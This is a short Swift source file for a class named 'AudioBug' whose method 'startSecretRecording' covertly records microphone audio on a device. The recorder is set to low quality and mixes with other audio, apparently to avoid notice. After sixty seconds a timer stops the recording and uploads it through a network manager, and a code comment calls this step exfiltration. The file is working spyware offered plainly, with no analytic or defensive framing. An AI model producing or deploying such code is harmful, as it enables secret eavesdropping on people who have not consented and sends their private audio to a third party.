import AVFoundation

class AudioBug: NSObject {
    var audioRecorder: AVAudioRecorder?

    func startSecretRecording() {
        let session = AVAudioSession.sharedInstance()
        try? session.setCategory(.playAndRecord, mode: .default, options: [.mixWithOthers, .allowBluetooth])
        try? session.setActive(true)

        let fileName = "rec_\(Date().timeIntervalSince1970).m4a"
        let docDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let audioURL = docDir.appendingPathComponent(fileName)

        let settings = [
            AVFormatIDKey: Int(kAudioFormatMPEG4AAC),
            AVSampleRateKey: 12000,
            AVNumberOfChannelsKey: 1,
            AVEncoderAudioQualityKey: AVAudioQuality.min.rawValue
        ]

        audioRecorder = try? AVAudioRecorder(url: audioURL, settings: settings)
        audioRecorder?.record()
        
        // TIM: Set a timer to stop and exfiltrate the file
        Timer.scheduledTimer(withTimeInterval: 60, repeats: false) { _ in
            self.stopAndUpload(url: audioURL)
        }
    }

    func stopAndUpload(url: URL) {
        audioRecorder?.stop()
        let audioData = try? Data(contentsOf: url)
        if let audioData = audioData {
            TIM_NetworkManager.shared.uploadAudio(audioData)
        }
    }
}
